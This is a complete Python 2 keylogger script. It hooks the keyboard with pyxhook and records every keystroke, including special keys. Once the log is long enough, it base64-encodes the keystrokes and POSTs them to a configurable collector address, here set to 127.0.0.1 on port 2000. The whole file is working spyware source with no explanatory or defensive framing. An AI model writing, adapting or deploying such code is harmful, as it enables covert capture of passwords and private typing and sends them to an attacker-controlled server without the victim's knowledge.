#!/usr/bin/env python2

import base64
import pyxhook
from requests import post
import urllib3

IP = "127.0.0.1"
PORT = "2000"

if __name__ == '__main__':
    log = ""
    line_counter = 50
    def OnKeyPress(event):
        global log
        global line_counter
        if len(log) >= line_counter:
            try:
                print "sending..."
                post("http://" + IP + ":" + PORT + "/", data=base64.b64encode(log))
                log = ""
                line_counter = 50
            except Exception as e:
                print "Failed..." + str(e)
                line_counter += 50
        if event.Ascii > 31 and event.Ascii < 126:
            log += chr(event.Ascii)
        else:
            log += "\n[" + event.Key + "]"

    new_hook=pyxhook.HookManager()
    new_hook.KeyDown=OnKeyPress
    new_hook.HookKeyboard()
    new_hook.start()
